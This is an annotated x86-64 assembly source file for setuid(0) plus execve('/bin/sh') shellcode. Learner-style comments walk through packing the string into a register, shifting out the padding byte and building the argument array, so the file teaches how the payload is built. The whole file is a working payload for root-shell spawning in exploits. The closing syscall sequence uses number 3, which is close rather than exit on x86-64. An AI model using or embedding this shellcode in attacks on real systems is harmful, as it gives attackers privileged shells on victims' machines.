section .text
global _start
_start:
    ; setuid 0
    xor rdi, rdi
    mov al, 0x69
    syscall

    ; we are able to mov 8 bytes into a single register due to this being x64
    ; you cant do this in x86, you need to push them on the stack and mov register, esp so you are
    ; able to get a pointer to your string hs/nib/ || /bin/sh
    ; this makes things much simpler
    ; when we unhex 68732f6e69622fff, we notice that 'hs/nib/' is only 7 bytes, so how come this
    ; wont copy over junk??
    ; notice the ff at the end, this does not represent any ascii character, so it will just be ignored
    ; this is needed due to the fact that mov might copy a random byte and corrupt our command
    ; we could also do something like hs/nib//, as this still gives us a shell

    mov rbx, 0x68732f6e69622fff
    ; next we have the shr instruction, why is this here, what is it doing??
    ; shr stands for 'shift right', it will do a bitwise shift on the value by the nth
    shr rbx, 0x8
    ; i guess we are still going to push and mov stack pointer
    push rbx
    mov rdi, rsp

    ; we need to supply a null/0 address before this
    xor rax, rax
    push rax
    push rdi

    ; source pointer now points to first parameter which is 0, then to the string /bin/sh
    mov rsi, rsp
    mov rax, 0x3b   ; execve syscall
    syscall

    push 0x1
    pop rdi
    push 0x3
    pop rax
    syscall


